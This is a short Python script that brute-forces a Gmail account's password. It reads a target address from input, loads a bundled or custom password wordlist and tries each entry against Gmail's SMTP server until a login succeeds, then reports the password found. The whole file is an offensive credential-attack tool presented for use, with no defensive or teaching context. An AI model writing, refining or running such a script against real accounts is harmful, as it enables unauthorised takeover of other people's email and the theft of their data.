import smtplib
import sys
from os import system
def artwork():
    print("\n")
    print("")
    print("\n")
    
    
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("While The Target Gmail Adress: ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '3' to Add a custom password list\n => ")

if pwd=='0':
    passswfile="passworld.txt"

elif pwd=='3':
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Pasword Is Wrong. %s " % password)
